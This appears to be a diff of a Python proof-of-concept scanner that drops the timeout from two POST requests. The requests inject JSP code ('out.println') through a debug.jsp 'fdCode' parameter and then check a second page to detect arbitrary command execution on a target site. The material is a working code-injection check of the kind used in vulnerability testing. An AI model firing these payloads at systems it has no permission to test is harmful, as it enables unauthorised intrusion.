@@ -42,8 +42,8 @@ class poc:
         data1 = 'var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println("hello world");'
         data2 = 'var={"body":{"file":"/sys/common/code.jsp"}}'
         try:
-            result1 = requests.post(url=url, data=data1, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            result2 = requests.post(url=url, data=data2, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result1 = requests.post(url=url, data=data1, headers=self.headers, verify=False, proxies=self.proxies)
+            result2 = requests.post(url=url, data=data2, headers=self.headers, verify=False, proxies=self.proxies)
             if "hello world" in result2.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
